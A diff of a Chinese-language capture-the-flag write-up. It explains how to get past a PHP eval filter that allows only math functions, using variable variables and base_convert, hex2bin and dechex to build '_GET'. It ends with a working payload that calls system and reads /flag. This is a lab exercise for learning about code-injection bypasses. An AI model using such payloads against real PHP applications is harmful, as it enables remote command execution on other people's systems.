@@ -35,10 +35,12 @@ if(!isset($_GET['c'])){
 
 ---
 emmm，只给数学函数感觉限死了，但`php`绝对不会让我们失望QwQ
+
 总体上就是利用可变变量和可变函数
 
 ---
 首先好像要拿一个变量承载字符串，于是选择最短的`pi`
+
 为了保持在80个字符之内，决定给`pi`赋一个`"_GET"`，也就是
 ```php
 $pi="_GET";
@@ -56,15 +58,25 @@ $_GET{abs}($_GET{cos})
 abs=system&cos=<command>
 ```
 即可
+
 问题转化为通过数学函数构造出`'_GET'`
+
 虽然但是，下划线和大写字母好难弄QAQ
+
 ![[Pasted image 20221202214151.png]]
+
 这个东西文档的解释完全没看懂哇wuwuwu
+
 意思好像就是说传入参数是一群字符的`ascii`码的十六进制形式连在一块，然后返回值是还原这些十六进制形式为原字符的结果
+
 也就是说只要构造出了`"hex2bin"`就可以通过`hex2bin`和`dechex`构造出`"_GET"`了
+
 `"hex2bin"`全是字母数字，可以直接`base_convert`QwQ
+
 ![[Pasted image 20221202215159.png]]
+
 ![[Pasted image 20221202215606.png]]
+
 所以就可以构造出最终`payload`啦
 ```php
 /?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{cos})&abs=system&cos=cat /flag
